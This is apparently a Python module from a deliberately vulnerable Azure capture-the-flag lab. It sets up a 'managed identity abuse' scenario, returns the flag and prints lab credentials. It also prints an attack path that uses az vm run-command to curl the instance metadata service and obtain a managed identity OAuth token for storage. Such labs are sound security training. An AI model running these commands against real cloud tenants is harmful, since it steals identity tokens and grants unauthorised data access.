from cumulonimbus.providers.base.application_configuration import ApplicationConfigurationAbstract
import cumulonimbus.core.utils as utils
import os


class ApplicationConfiguration(ApplicationConfigurationAbstract):
    def configure_application(self, **kwargs):
        key_pair_path = utils.get_key_pair_path('managed_identity_abuse')
        os.system("ssh-keygen -t rsa -b 4096 -f {} -N ''".format(key_pair_path))

    def get_flag(self):
        return "CUMULONIMBUS{M4n4g3d_1d3nt1ty_4bus3}"

    def pretty_print_tf_output(self, app_id, output):
        print("###############################################")
        print("#             Required Information            #")
        print("###############################################")
        print("[1] Attacker username : " + output["attacker_username"]["value"])
        print("[2] Attacker password : " + output["attacker_password"]["value"])
        print("[3] VM name           : " + output["vm_name"]["value"])
        print("[4] Resource group    : " + output["resource_group_name"]["value"])
        print("[5] Storage account   : " + output["storage_account_name"]["value"])
        print("")
        print("Attack path:")
        print("  az login -u '{}' -p '<password>'".format(output["attacker_username"]["value"]))
        print("  az vm run-command invoke \\")
        print("    --resource-group '{}' \\".format(output["resource_group_name"]["value"]))
        print("    --name '{}' \\".format(output["vm_name"]["value"]))
        print("    --command-id RunShellScript \\")
        print("    --scripts \"curl -s -H 'Metadata: true' \\")
        print("      'http://169.254.169.254/metadata/identity/oauth2/token")
        print("       ?api-version=2018-02-01&resource=https://storage.azure.com/'\"")
